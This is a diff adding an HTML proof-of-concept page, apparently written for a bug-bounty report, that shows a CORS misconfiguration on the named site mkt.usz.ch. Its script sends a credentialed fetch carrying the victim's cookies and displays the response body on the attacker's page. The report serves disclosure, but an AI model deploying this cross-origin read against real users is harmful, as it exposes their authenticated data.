@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>CORS PoC - mkt.usz.ch</title>
+    <style>
+        body {font-family: Arial, sans-serif; padding: 2rem; background: #f8f8f8; line-height: 1.7;}
+        pre {background: white; padding: 1rem; border: 1px solid #ccc; white-space: pre-wrap; word-break: break-all;}
+    </style>
+</head>
+<body>
+    <h1>CORS Misconfiguration Proof of Concept</h1>
+    <p>Target: <strong>https://mkt.usz.ch</strong></p>
+    <p>Sending request to the target with your cookies (<code>atid</code>, <code>atidx</code>)...</p>
+    <pre id="result">Loading...</pre>
+
+    <p><strong>Note for Triager:</strong> The successful reading of the response body below proves the Same-Origin Policy was bypassed. For proof of the reflected headers (Access-Control-Allow-Origin: Attacker's Domain and Access-Control-Allow-Credentials: true), please refer to the attached **Burp Suite screenshot**.</p>
+
+    <script>
+        fetch('https://mkt.usz.ch/', {
+            method: 'GET',
+            credentials: 'include' // Sends cookies
+        })
+        .then(r => r.text())
+        .then(body => {
+            document.getElementById('result').textContent = 
+                "✅ Request successfully completed and server response (Proof of SOP Bypass):\n\n" + body;
+        })
+        .catch(err => {
+            document.getElementById('result').textContent = "Error: " + err;
+        });
+    </script>
+</body>
+</html>
